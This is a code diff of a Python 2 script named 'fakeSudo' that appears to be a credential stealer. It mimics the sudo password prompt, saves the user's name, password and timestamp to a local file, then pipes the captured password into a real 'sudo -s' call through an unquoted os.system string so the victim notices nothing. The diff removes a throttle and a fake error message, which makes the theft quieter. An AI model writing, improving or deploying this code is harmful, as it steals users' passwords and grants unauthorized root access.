@@ -8,9 +8,6 @@ import sys
 
 catchFile = "--catched--"
 
-
-
-
 def fakeSudo():
 	def savePass(passwd):
 		try:
@@ -18,44 +15,23 @@ def fakeSudo():
 		except:
 			file = open(catchFile, 'w')		
 
-		catch = "%s|%s|%s\n" % (getuser(), passwd, str(time.time()))
+		catch = "%s|%s|%s\n" % (getuser(), passwd, str(time.ctime()))
 		file.write(catch)
 		file.close()
 
-	def checkForTime():
-		"Function for making pauses betwen catching passes"
-		now = time.time()
-		minDelay = 2*24*60*60 # min delay is two days
-		
-		try:
-			file = open(catchFile, 'r')
-			data = file.read()
-			
-			for line in data.splitlines():
-				if now - float(line.split("|")[2]) < minDelay: # if the command was runned not more than two days ago
-					return False
-			return True # if code didnot returned anything yet then return true - there is no exception
-		
-		except:
-			return True
+	# Catch pass:
+	try:
+		passwd = getpass("[fakesudo] password for %s: " % getuser())
+	except KeyboardInterrupt:
+		passwd = getpass("Password: ")
 
-	if checkForTime():
-		# Catch pass:
-		try:
-			passwd = getpass("[fakesudo] password for %s: " % getuser())
-		except KeyboardInterrupt:
-			passwd = getpass("Password: ")
-		# Save pass:
-		savePass(passwd)
-
-		# for some reason sudo have ~2 s pouse. 
-		time.sleep(2)
-		print "Sorry, try again."
-	else:
-		pass
+	# Save pass:
+	savePass(passwd)
 		
 	# Do the command: 
-	sudocmd = " ".join(sys.argv[1:])
+        # change this to some python pipeline or what!
+	sudocmd =  'echo "%s" | sudo -s %s' % (passwd, " ".join(sys.argv[2:]))
+	
 	os.system(sudocmd)
 
 
@@ -87,21 +63,10 @@ except:
 	exit()
 
 
-
-
-
 if mode == "sudo":	
 	fakeSudo()
 
 if mode == "type":
 	fakeType()
-
-
-
-
-
-
-
-
 
 
